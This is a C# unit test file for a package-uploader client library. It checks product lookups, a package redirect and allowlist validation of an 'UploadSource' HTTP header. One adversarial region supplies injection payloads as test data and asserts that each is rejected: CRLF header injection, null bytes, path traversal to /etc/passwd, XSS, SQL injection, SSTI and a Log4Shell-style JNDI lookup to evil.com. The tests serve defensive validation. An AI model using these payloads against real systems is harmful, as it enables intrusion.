// Copyright (c) Microsoft Corporation.
// Licensed under the MIT License.

using PackageUploader.ClientApi.Client.Ingestion;
using PackageUploader.ClientApi.Client.Ingestion.Exceptions;
using PackageUploader.ClientApi.Client.Ingestion.Models;
using PackageUploader.ClientApi.Client.Xfus.Uploader;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Moq;
using System;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using PackageUploader.ClientApi.Client.Ingestion.Client;
using PackageUploader.ClientApi.Client.Ingestion.Models.Internal;
using System.Collections.Generic;
using Microsoft.Extensions.Logging;
using Moq.Protected;
using System.Net.Http.Json;
using PackageUploader.ClientApi.Client.Ingestion.Mappers;

namespace PackageUploader.ClientApi.Test;

[TestClass]
public class PackageUploaderServiceTest
{
    private const string TestBigId = "TestBigId";
    private const string TestProductId = "TestProductId";

    private const string TestMovedPackageId = "TestMovedPackageId";
    private const string TestMovedPackageToId = "TestMovedPackageToId";

    private const string TestUnauthorizedBigId = "TestUnauthorizedBigId";
    private const string TestUnauthorizedProductId = "TestUnauthorizedProductId";

    private GameProduct _testProduct;
    private PackageUploaderService _packageUploaderService;
    private IngestionRedirectPackage _redirectPackage;
    private IngestionGamePackage _movedPackage;
    private IngestionHttpClient _ingestionClient;

    [TestInitialize]
    public void Initialize()
    {
        _testProduct = new GameProduct
        {
            BigId = TestBigId,
            ProductId = TestProductId,
        };

        _redirectPackage = new IngestionRedirectPackage
        {
            Id = TestMovedPackageId,
            ToId = TestMovedPackageToId,
            ProcessingState = GamePackageState.Processed.ToString()
        };
        _movedPackage = new IngestionGamePackage
        {
            Id = TestMovedPackageToId,
            State = GamePackageState.Processed.ToString(),
        };

        var logger = new NullLogger<PackageUploaderService>();

        var ingestionClient = new Mock<IIngestionHttpClient>();
        ingestionClient.Setup(p => p.GetGameProductByLongIdAsync(TestProductId, It.IsAny<CancellationToken>()))
            .ReturnsAsync(_testProduct);
        ingestionClient.Setup(p => p.GetGameProductByBigIdAsync(TestBigId, It.IsAny<CancellationToken>()))
            .ReturnsAsync(_testProduct);

        ingestionClient.Setup(p => p.GetGameProductByLongIdAsync(TestUnauthorizedProductId, It.IsAny<CancellationToken>()))
            .ThrowsAsync(new HttpRequestException(string.Empty, null, HttpStatusCode.Unauthorized));
        ingestionClient.Setup(p => p.GetGameProductByBigIdAsync(TestUnauthorizedBigId, It.IsAny<CancellationToken>()))
            .ThrowsAsync(new HttpRequestException(string.Empty, null, HttpStatusCode.Unauthorized));

        ingestionClient.Setup(p => p.GetGameProductByLongIdAsync(It.IsNotIn(TestProductId, TestUnauthorizedProductId), It.IsAny<CancellationToken>()))
            .ThrowsAsync(new ProductNotFoundException(string.Empty));
        ingestionClient.Setup(p => p.GetGameProductByBigIdAsync(It.IsNotIn(TestBigId, TestUnauthorizedBigId), It.IsAny<CancellationToken>()))
            .ThrowsAsync(new ProductNotFoundException(string.Empty));

        var xfusUploader = new Mock<IXfusUploader>();

        _packageUploaderService = new PackageUploaderService(ingestionClient.Object, xfusUploader.Object, logger);

        var httpClient = new Mock<HttpClient>();
        // Helpful References:
        // https://stackoverflow.com/questions/36425008/mocking-httpclient-in-unit-tests
        //https://stackoverflow.com/questions/60094386/moq-verify-on-a-mocked-httpclienthandler-cant-access-the-content-object-becau
        httpClient.Setup(p => p.SendAsync(It.Is<HttpRequestMessage>(m => m.RequestUri.ToString().Contains($"products/{TestProductId}/packages/{TestMovedPackageId}")), 
                                          It.IsAny<CancellationToken>()))
            .ReturnsAsync(() => new HttpResponseMessage(HttpStatusCode.MovedPermanently) { Content = JsonContent.Create<IngestionRedirectPackage>(_redirectPackage) });
        httpClient.Setup(p => p.SendAsync(It.Is<HttpRequestMessage>(m => m.RequestUri.ToString().Contains($"products/{TestProductId}/packages/{TestMovedPackageToId}")),
                                          It.IsAny<CancellationToken>()))
            .ReturnsAsync(() => new HttpResponseMessage(HttpStatusCode.OK) { Content = JsonContent.Create<IngestionGamePackage>(_movedPackage) });

        var loggerIngestionClient = new NullLogger<IngestionHttpClient>();
        _ingestionClient = new IngestionHttpClient(loggerIngestionClient, httpClient.Object, null, null);
    }

    [TestMethod]
    public void UploadSourceHeader_DefaultsToPackageUploader_WhenConfigIsNull()
    {
        // IngestionHttpClient constructed with null UploadSourceConfig should default to "PackageUploader"
        HttpRequestMessage capturedRequest = null;

        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        var client = new IngestionHttpClient(logger, httpClient, null, null);

        // Act — make any request to trigger CreateJsonRequestMessage
        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { /* ignore deserialization issues */ }

        // Assert
        Assert.IsNotNull(capturedRequest, "No HTTP request was captured");
        Assert.IsTrue(capturedRequest.Headers.Contains("UploadSource"), "UploadSource header is missing");
        var values = capturedRequest.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual(1, values.Length);
        Assert.AreEqual("PackageUploader", values[0]);
    }

    [TestMethod]
    public void UploadSourceHeader_UsesConfigValue_WhenProvided()
    {
        HttpRequestMessage capturedRequest = null;

        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        var config = new UploadSourceConfig { UploadSource = "PackageUploader" };
        var client = new IngestionHttpClient(logger, httpClient, null, config);

        // Act
        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { }

        // Assert
        Assert.IsNotNull(capturedRequest);
        var values = capturedRequest.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual("PackageUploader", values[0]);
    }

    [TestMethod]
    public void UploadSourceHeader_DefaultsToPackageUploader_WhenConfigValueEmpty()
    {
        HttpRequestMessage capturedRequest = null;

        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        var config = new UploadSourceConfig { UploadSource = "" };
        var client = new IngestionHttpClient(logger, httpClient, null, config);

        // Act
        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { }

        // Assert
        Assert.IsNotNull(capturedRequest);
        var values = capturedRequest.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual("PackageUploader", values[0], "Empty UploadSource should fall back to default");
    }

    [TestMethod]
    public void UploadSourceHeader_RejectsUnknownValue_FallsBackToDefault()
    {
        HttpRequestMessage capturedRequest = null;

        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        // "EvilSource" is not in the allowlist — should fall back to "PackageUploader"
        var config = new UploadSourceConfig { UploadSource = "EvilSource" };
        var client = new IngestionHttpClient(logger, httpClient, null, config);

        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { }

        Assert.IsNotNull(capturedRequest);
        var values = capturedRequest.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual("PackageUploader", values[0], "Unknown UploadSource should fall back to default");
    }

    [TestMethod]
    public void UploadSourceHeader_TrimsWhitespace()
    {
        HttpRequestMessage capturedRequest = null;

        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        var config = new UploadSourceConfig { UploadSource = "  PackageUploader  " };
        var client = new IngestionHttpClient(logger, httpClient, null, config);

        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { }

        Assert.IsNotNull(capturedRequest);
        var values = capturedRequest.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual("PackageUploader", values[0], "Whitespace should be trimmed from UploadSource");
    }


    #region Adversarial UploadSource Tests

    // Utility: builds an IngestionHttpClient and makes a request, returning the captured HttpRequestMessage
    private HttpRequestMessage MakeRequestWithUploadSource(string uploadSourceValue)
    {
        HttpRequestMessage capturedRequest = null;
        var handler = new Mock<HttpMessageHandler>();
        handler.Protected()
            .Setup<Task<HttpResponseMessage>>("SendAsync",
                ItExpr.IsAny<HttpRequestMessage>(),
                ItExpr.IsAny<CancellationToken>())
            .Callback<HttpRequestMessage, CancellationToken>((req, _) => capturedRequest = req)
            .ReturnsAsync(new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = JsonContent.Create(new IngestionGameProduct { Id = TestProductId })
            });

        var httpClient = new HttpClient(handler.Object) { BaseAddress = new Uri("https://test.example.com/") };
        var logger = new NullLogger<IngestionHttpClient>();
        var config = uploadSourceValue == null ? null : new UploadSourceConfig { UploadSource = uploadSourceValue };
        var client = new IngestionHttpClient(logger, httpClient, null, config);

        try { client.GetGameProductByLongIdAsync(TestProductId, CancellationToken.None).GetAwaiter().GetResult(); } catch { }
        return capturedRequest;
    }

    private static string GetUploadSourceValue(HttpRequestMessage request) =>
        request.Headers.GetValues("UploadSource").First();

    private static string EscapeForDisplay(string s) =>
        s?.Replace("\r", "\\r").Replace("\n", "\\n").Replace("\0", "\\0") ?? "(null)";

    [TestMethod]
    [DataRow("\r\nX-Injected: evil", DisplayName = "CRLF injection")]
    [DataRow("PackageUploader\r\nX-Evil: hacked", DisplayName = "CRLF after valid value")]
    [DataRow("\nX-Injected: evil", DisplayName = "LF-only injection")]
    [DataRow("PackageUploader\n", DisplayName = "Trailing newline after valid")]
    [DataRow("\r\n\r\n<html>evil</html>", DisplayName = "CRLF double to inject body")]
    public void Adversarial_CrlfInjection_FallsBackToDefault(string maliciousValue)
    {
        var request = MakeRequestWithUploadSource(maliciousValue);
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request),
            $"CRLF injection '{EscapeForDisplay(maliciousValue)}' must be rejected");
    }

    [TestMethod]
    [DataRow("PackageUploader\0evil", DisplayName = "Null byte after valid value")]
    [DataRow("\0XGPM", DisplayName = "Null byte before valid value")]
    [DataRow("Package\0Uploader", DisplayName = "Null byte in middle")]
    public void Adversarial_NullByteInjection_FallsBackToDefault(string maliciousValue)
    {
        var request = MakeRequestWithUploadSource(maliciousValue);
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request),
            "Null byte injection must be rejected");
    }

    [TestMethod]
    [DataRow("PACKAGEUPLOADER", DisplayName = "All caps")]
    [DataRow("packageuploader", DisplayName = "All lowercase")]
    [DataRow("PaCkAgEuPlOaDeR", DisplayName = "Random case")]
    public void Adversarial_CaseVariations_AcceptedByAllowlist(string caseVariant)
    {
        var request = MakeRequestWithUploadSource(caseVariant);
        Assert.IsNotNull(request);
        Assert.AreEqual(caseVariant, GetUploadSourceValue(request),
            $"Case variant '{caseVariant}' should be accepted (OrdinalIgnoreCase)");
    }

    [TestMethod]
    [DataRow("XGPM", DisplayName = "XGPM not in allowlist")]
    [DataRow("xgpm", DisplayName = "XGPM lowercase not in allowlist")]
    [DataRow("PackageUploader2", DisplayName = "Suffix digit")]
    [DataRow("XPackageUploader", DisplayName = "Prefix char")]
    [DataRow("XGPM_Extended", DisplayName = "Underscore extension")]
    [DataRow("PackageUploader XGPM", DisplayName = "Both values concatenated")]
    [DataRow("NotARealSource", DisplayName = "Arbitrary string")]
    [DataRow("admin", DisplayName = "Common privilege keyword")]
    [DataRow("../../../etc/passwd", DisplayName = "Path traversal")]
    [DataRow("<script>alert(1)</script>", DisplayName = "XSS payload")]
    [DataRow("'; DROP TABLE uploads; --", DisplayName = "SQL injection")]
    [DataRow("{{7*7}}", DisplayName = "SSTI template injection")]
    [DataRow("${jndi:ldap://evil.com/a}", DisplayName = "Log4Shell-style")]
    public void Adversarial_InvalidValues_FallBackToDefault(string invalidValue)
    {
        var request = MakeRequestWithUploadSource(invalidValue);
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request),
            $"Invalid value '{invalidValue}' must be rejected");
    }

    [TestMethod]
    [DataRow("PackageUploader ", DisplayName = "Trailing space")]
    [DataRow(" PackageUploader", DisplayName = "Leading space")]
    [DataRow("\tPackageUploader", DisplayName = "Leading tab")]
    [DataRow("  PackageUploader\t\t", DisplayName = "Mixed whitespace")]
    public void Adversarial_WhitespacePadding_TrimsAndAccepts(string paddedValue)
    {
        var request = MakeRequestWithUploadSource(paddedValue);
        Assert.IsNotNull(request);
        Assert.AreEqual(paddedValue.Trim(), GetUploadSourceValue(request),
            "Whitespace-padded valid values should be trimmed and accepted");
    }

    [TestMethod]
    [DataRow("Pаckageuploader", DisplayName = "Cyrillic 'а' (U+0430) instead of Latin 'a'")]
    [DataRow("ХGPM", DisplayName = "Cyrillic 'Х' (U+0425) instead of Latin 'X'")]
    [DataRow("Package\u200BUploader", DisplayName = "Zero-width space in middle")]
    [DataRow("\uFEFFPackageUploader", DisplayName = "BOM prefix")]
    [DataRow("PackageUploader\u200D", DisplayName = "Zero-width joiner suffix")]
    public void Adversarial_HomoglyphAndUnicode_FallsBackToDefault(string unicodeAttack)
    {
        var request = MakeRequestWithUploadSource(unicodeAttack);
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request),
            $"Unicode homoglyph/invisible char attack must be rejected");
    }

    [TestMethod]
    public void Adversarial_VeryLongString_FallsBackToDefault()
    {
        var request = MakeRequestWithUploadSource(new string('A', 10_000));
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request),
            "10K-char string must be rejected by allowlist");
    }

    [TestMethod]
    public void Adversarial_ExactlyOneHeaderValue_NoDuplication()
    {
        var request = MakeRequestWithUploadSource(null); // default path
        Assert.IsNotNull(request);
        var values = request.Headers.GetValues("UploadSource").ToArray();
        Assert.AreEqual(1, values.Length, "UploadSource header must appear exactly once");
        Assert.AreEqual("PackageUploader", values[0]);
    }

    [TestMethod]
    public void Adversarial_EmptyString_FallsBackToDefault()
    {
        var request = MakeRequestWithUploadSource("");
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request));
    }

    [TestMethod]
    public void Adversarial_WhitespaceOnly_FallsBackToDefault()
    {
        var request = MakeRequestWithUploadSource("   \t\t   ");
        Assert.IsNotNull(request);
        Assert.AreEqual("PackageUploader", GetUploadSourceValue(request));
    }

    #endregion

    [TestMethod]
    public async Task GetProductByProductIdTest()
    {
        var productResult = await _packageUploaderService.GetProductByProductIdAsync(TestProductId, CancellationToken.None);

        Assert.IsNotNull(productResult);
        Assert.AreEqual(TestProductId, productResult.ProductId);
    }

    [TestMethod]
    public async Task GetProductByBigIdTest()
    {
        var productResult = await _packageUploaderService.GetProductByBigIdAsync(TestBigId, CancellationToken.None);

        Assert.IsNotNull(productResult);
        Assert.AreEqual(TestBigId, productResult.BigId);
    }

    [TestMethod]
    public async Task GetProductByProductIdNullTest()
    {
        await Assert.ThrowsAsync<ArgumentNullException>(() => _packageUploaderService.GetProductByProductIdAsync(null, CancellationToken.None));
    }

    [TestMethod]
    public async Task GetProductByBigIdNullTest()
    {
        await Assert.ThrowsAsync<ArgumentNullException>(() => _packageUploaderService.GetProductByBigIdAsync(null, CancellationToken.None));
    }

    [TestMethod]
    [DataRow("")]
    [DataRow(" ")]
    [DataRow("     ")]
    public async Task GetProductByProductIdEmptyTest(string productId)
    {
        await Assert.ThrowsAsync<ArgumentException>(() => _packageUploaderService.GetProductByProductIdAsync(productId, CancellationToken.None));
    }

    [TestMethod]
    [DataRow("")]
    [DataRow(" ")]
    [DataRow("     ")]
    public async Task GetProductByBigIdEmptyTest(string bigId)
    {
        await Assert.ThrowsAsync<ArgumentException>(() => _packageUploaderService.GetProductByBigIdAsync(bigId, CancellationToken.None));
    }

    [TestMethod]
    public async Task GetProductByProductIdNotFoundTest()
    {
        await Assert.ThrowsAsync<ProductNotFoundException>(() => _packageUploaderService.GetProductByBigIdAsync("ProductIdNotFound", CancellationToken.None));
    }

    [TestMethod]
    public async Task GetProductByBigIdNotFoundTest()
    {
        await Assert.ThrowsAsync<ProductNotFoundException>(() => _packageUploaderService.GetProductByBigIdAsync("BigIdNotFound", CancellationToken.None));
    }
        
    [TestMethod]
    public async Task GetProductByProductIdUnauthorizedTest()
    {
        await Assert.ThrowsAsync<HttpRequestException>(() => _packageUploaderService.GetProductByProductIdAsync(TestUnauthorizedProductId, CancellationToken.None));
    }

    [TestMethod]
    public async Task GetProductByBigIdUnauthorizedTest()
    {
        await Assert.ThrowsAsync<HttpRequestException>(() => _packageUploaderService.GetProductByBigIdAsync(TestUnauthorizedBigId, CancellationToken.None));
    }

    [TestMethod]
    public async Task GetPackageByIdAsyncRedirectTest()
    {
        var packageResult = await _ingestionClient.GetPackageByIdAsync(TestProductId, TestMovedPackageId, CancellationToken.None);
        Assert.IsNotNull(packageResult);
        Assert.AreEqual(TestMovedPackageToId, packageResult.Id);
        Assert.AreEqual(_movedPackage.State, packageResult.State.ToString());
    }
}